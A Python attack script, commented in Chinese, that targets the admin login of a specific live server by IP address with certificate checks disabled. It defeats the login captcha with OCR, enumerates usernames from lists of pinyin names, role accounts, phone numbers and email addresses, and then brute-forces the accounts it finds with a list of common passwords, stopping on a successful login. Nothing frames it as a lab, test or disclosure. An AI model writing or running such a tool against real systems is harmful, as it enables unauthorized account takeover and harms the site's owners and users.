#!/usr/bin/env python3
"""扩大用户枚举 - 打印所有结果"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    try:
        r = op.open(f"{B}/customer/admin/verify.html", timeout=10)
        return r.read()
    except Exception:
        return None

def login_raw(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=10)
        return r.read().decode("utf-8","ignore")
    except Exception:
        return "HTTP500"

def probe(user, pwd="x", max_attempts=8):
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None: time.sleep(1); continue
        try: code = ocr.classification(cap)
        except Exception: continue
        if len(code) != 4: continue
        r = login_raw(user, pwd, code)
        if "验证码" in r: continue
        if "HTTP500" in r: return "NONE"
        return r
        time.sleep(0.15)
    return "VERIFY_FAIL"

# 更广的用户名: 拼音名+手机+邮箱+系统名
users = []
names = ["admin","zhilian","zy","kefu","chao","chaoliu","juhe","liu","zhang","wang",
         "li","chen","yang","zhao","huang","zhou","wu","xu","sun","ma","zhu","hu",
         "guo","he","gao","lin","luo","zheng","liang","xie","song","tang","han",
         "cai","jia","long","duan","lei","tian","jiang","fan","peng","tan","wei",
         "ye","su","wei2","cheng","pan","qin","yu","dong","shen","ren","yao","lu",
         "fu","zhong","xiao","yang2","yuan","feng","song2","chai","bo","ding","tian2",
         "kefu1","kefu2","admin1","admin2","admin01","zy01","chao01","zhilian01",
         "super","root","test","demo","user","manager","operator","system","guest",
         "service","support","sales","xiaoshou","shouhou","jishu","caiwu","renshi",
         "zongjian","jingli","fuzong","dongshi","laoban","gongsi","qiye","kehuduan"]
# 手机号格式用户
for p in ["13800138000","18888888888","15888888888","13900000000","13700000000","18600000000"]:
    users.append(p)
# 邮箱前缀
for e in ["admin@","kefu@","zy@","zhilian@","chao@","juhe@","service@","test@"]:
    users.append(e + "qq.com")
    users.append(e + "163.com")
    users.append(e + "126.com")

users = list(dict.fromkeys(names + users))
print(f"字典: {len(users)}", flush=True)

existing = []
for idx, u in enumerate(users):
    r = probe(u)
    if r == "NONE":
        if idx % 20 == 0: print(f"[{idx}] {u}: 不存在", flush=True)
        continue
    if r == "VERIFY_FAIL":
        print(f"[{idx}] {u}: 验证码失败", flush=True)
        continue
    print(f"### 存在? {u}: {r[:100]}", flush=True)
    existing.append(u)

print(f"候选: {existing}", flush=True)

passwords = ["123456","admin123","admin","12345678","admin888","123123","admin666",
             "admin@123","123456789","password","111111","888888","a123456",
             "Aa123456","abc123","1234567890","qwerty","1qaz2wsx","admin2024",
             "admin2025","admin2026","test123","yun123","boss123","chao123",
             "juhe123","zhilian123","kefu123","zy123456","zhilian888","kefu888",
             "zhilian@123","zy@123","chao@123","135790","246810"]

for user in existing:
    print(f"--- 爆破 {user} ---", flush=True)
    for pw in passwords:
        r = probe(user, pw)
        if r == "NONE" or r == "VERIFY_FAIL": continue
        if "密码" in r or "账号" in r or "失败" in r: continue
        print(f"!!! 非密码错误: {user}/{pw} -> {r[:100]}", flush=True)
        if '"status":1' in r or "success" in r.lower():
            print(f"!!! 登录成功 {user}/{pw}", flush=True)
            sys.exit(0)
print("DONE")
